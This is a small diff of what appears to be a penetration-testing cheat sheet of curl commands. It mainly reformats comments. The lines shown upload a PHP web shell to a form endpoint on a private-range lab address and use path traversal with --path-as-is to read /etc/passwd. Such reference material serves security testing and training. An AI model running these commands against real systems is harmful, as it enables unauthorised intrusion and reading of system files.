@@ -33,18 +33,18 @@ curl -X PUT http://10.10.11.10/test.txt --data-binary @test.aspx
 ```
 
 ```bash
-# POST a file with form param `file`
+# POST a file with form param 'file'
 curl -X POST -F "file=@shell.php;type=application/php;filename=shell.php" http://10.10.11.10/upload
 ```
 
 ```bash
-# POST a file in raw-text format (not as attachment) with form param `file`
+# POST a file in raw-text format (not as attachment) with form param 'file'
 curl -X POST -F 'file=<shell.zip' http://10.10.11.10/upload
 ```
 
 ```bash
-# Not to handle sequences of `/../` or `/./` in the given URL
-curl --path-as-is http://10.10.11.10/../../../../etc/passwd
+# Not to handle sequences of '/../' or '/./' in the given URL
+curl --path-as-is --ignore-content-length http://10.10.11.10/../../../../etc/passwd
 ```
 
 ```bash
